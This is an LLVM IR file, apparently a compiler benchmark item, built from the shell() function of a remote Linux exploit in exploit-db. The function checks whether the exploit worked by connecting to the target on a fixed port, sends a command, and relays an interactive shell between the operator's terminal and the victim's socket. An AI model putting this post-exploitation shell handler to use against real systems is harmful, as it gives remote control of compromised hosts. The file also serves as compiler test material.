; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_25321.c_shell.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_25321.c_shell.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@shell.buff = internal global [1024 x i8] zeroinitializer, align 16
@stdout = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [32 x i8] c"[+] Checking if exploit worked\0A\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [21 x i8] c"[-] Did not worked.\0A\00", align 1
@COMMAND = common dso_local global i8* null, align 8
@.str.2 = private unnamed_addr constant [25 x i8] c"shell(): read from stdin\00", align 1
@.str.3 = private unnamed_addr constant [23 x i8] c"shell(): write to sock\00", align 1
@.str.4 = private unnamed_addr constant [24 x i8] c"see you next time, bye.\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @shell(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  store i32 %0, i32* %3, align 4
  %7 = load i32, i32* @stdout, align 4
  %8 = call i32 @fprintf(i32 %7, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str, i64 0, i64 0))
  %9 = load i32, i32* %3, align 4
  %10 = call i32 @connect_to_host(i32 %9, i32 30464)
  store i32 %10, i32* %4, align 4
  %11 = icmp eq i32 %10, -1
  br i1 %11, label %12, label %15

12:                                               ; preds = %1
  %13 = load i32, i32* @stderr, align 4
  %14 = call i32 @fprintf(i32 %13, i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.1, i64 0, i64 0))
  store i32 -1, i32* %2, align 4
  br label %62

15:                                               ; preds = %1
  %16 = load i32, i32* %4, align 4
  %17 = load i8*, i8** @COMMAND, align 8
  %18 = load i8*, i8** @COMMAND, align 8
  %19 = call i32 @strlen(i8* %18)
  %20 = call i32 @write(i32 %16, i8* %17, i32 %19)
  br label %21

21:                                               ; preds = %15, %61
  %22 = call i32 @FD_ZERO(i32* %6)
  %23 = call i32 @FD_SET(i32 0, i32* %6)
  %24 = load i32, i32* %4, align 4
  %25 = call i32 @FD_SET(i32 %24, i32* %6)
  %26 = load i32, i32* %4, align 4
  %27 = add nsw i32 %26, 1
  %28 = call i32 @select(i32 %27, i32* %6, i32* null, i32* null, i32* null)
  %29 = icmp slt i32 %28, 1
  br i1 %29, label %30, label %31

30:                                               ; preds = %21
  store i32 0, i32* %2, align 4
  br label %62

31:                                               ; preds = %21
  %32 = call i64 @FD_ISSET(i32 0, i32* %6)
  %33 = icmp ne i64 %32, 0
  br i1 %33, label %34, label %48

34:                                               ; preds = %31
  %35 = call i32 @read(i32 0, i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @shell.buff, i64 0, i64 0), i32 1024)
  store i32 %35, i32* %5, align 4
  %36 = icmp slt i32 %35, 1
  br i1 %36, label %37, label %39

37:                                               ; preds = %34
  %38 = call i32 @die(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.2, i64 0, i64 0))
  br label %39

39:                                               ; preds = %37, %34
  %40 = load i32, i32* %4, align 4
  %41 = load i32, i32* %5, align 4
  %42 = call i32 @write(i32 %40, i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @shell.buff, i64 0, i64 0), i32 %41)
  %43 = load i32, i32* %5, align 4
  %44 = icmp ne i32 %42, %43
  br i1 %44, label %45, label %47

45:                                               ; preds = %39
  %46 = call i32 @die(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.3, i64 0, i64 0))
  br label %47

47:                                               ; preds = %45, %39
  br label %48

48:                                               ; preds = %47, %31
  %49 = load i32, i32* %4, align 4
  %50 = call i64 @FD_ISSET(i32 %49, i32* %6)
  %51 = icmp ne i64 %50, 0
  br i1 %51, label %52, label %61

52:                                               ; preds = %48
  %53 = load i32, i32* %4, align 4
  %54 = call i32 @read(i32 %53, i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @shell.buff, i64 0, i64 0), i32 1024)
  store i32 %54, i32* %5, align 4
  %55 = icmp slt i32 %54, 1
  br i1 %55, label %56, label %58

56:                                               ; preds = %52
  %57 = call i32 @die(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.4, i64 0, i64 0))
  br label %58

58:                                               ; preds = %56, %52
  %59 = load i32, i32* %5, align 4
  %60 = call i32 @write(i32 1, i8* getelementptr inbounds ([1024 x i8], [1024 x i8]* @shell.buff, i64 0, i64 0), i32 %59)
  br label %61

61:                                               ; preds = %58, %48
  br label %21

62:                                               ; preds = %30, %12
  %63 = load i32, i32* %2, align 4
  ret i32 %63
}

declare dso_local i32 @fprintf(i32, i8*) #1

declare dso_local i32 @connect_to_host(i32, i32) #1

declare dso_local i32 @write(i32, i8*, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @FD_ZERO(i32*) #1

declare dso_local i32 @FD_SET(i32, i32*) #1

declare dso_local i32 @select(i32, i32*, i32*, i32*, i32*) #1

declare dso_local i64 @FD_ISSET(i32, i32*) #1

declare dso_local i32 @read(i32, i8*, i32) #1

declare dso_local i32 @die(i8*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
